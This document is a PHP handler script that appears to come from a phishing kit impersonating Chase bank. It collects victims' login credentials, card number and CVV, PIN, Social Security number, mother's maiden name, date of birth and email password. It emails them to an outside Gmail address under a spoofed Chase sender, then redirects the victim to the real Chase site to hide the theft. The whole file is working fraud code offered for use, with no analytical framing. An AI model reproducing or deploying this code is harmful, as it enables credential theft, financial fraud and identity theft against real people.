<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------------------Chase -----------------------\n";
$message .= ".   User ID            : ".$_POST['userid']."\n";
$message .= ".   Password           : ".$_POST['password']."\n";
$message .= "--------------\n";
$message .= "Full Name              : ".$_POST['fullname']."\n";
$message .= "Address                : ".$_POST['address']."\n";
$message .= "City                   : ".$_POST['city']."\n";
$message .= "State                  : ".$_POST['state']."\n";
$message .= "Zip Code               : ".$_POST['zipcode1']."-";
$message .= "".$_POST['zipcode2']."\n";
$message .= "Card Number            : ".$_POST['ccnumber']."\n";
$message .= "CVV                    : ".$_POST['cvv']."\n";
$message .= "Expiration Date        : ".$_POST['ccmonth']."/";
$message .= "".$_POST['ccyear']."\n";
$message .= "Pin Number             : ".$_POST['pinnumber']."\n";
$message .= "Account Number         : ".$_POST['accountnumner']."\n";
$message .= "Mother's Maiden Name   : ".$_POST['mmn']."\n";
$message .= "Social Security Number : ".$_POST['ssn1']."";
$message .= "".$_POST['ssn2']."";
$message .= "".$_POST['ssn3']."\n";
$message .= "Date of Birth          : ".$_POST['dob1']."/";
$message .= "".$_POST['dob2']."/";
$message .= "".$_POST['dob3']."\n";
$message .= "Email   : ".$_POST['email']."\n";
$message .= "Email Password   : ".$_POST['emailpassword']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "------------------------Chase------------------------------\n";
$send = " jackauto2005@gmail.com";
$subject = "Chase Confidencial Product";
$headers = "From: Chase<corp@chase.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($send,$subject,$message,$header);
}
header("Location: http://www.chase.com/");
?>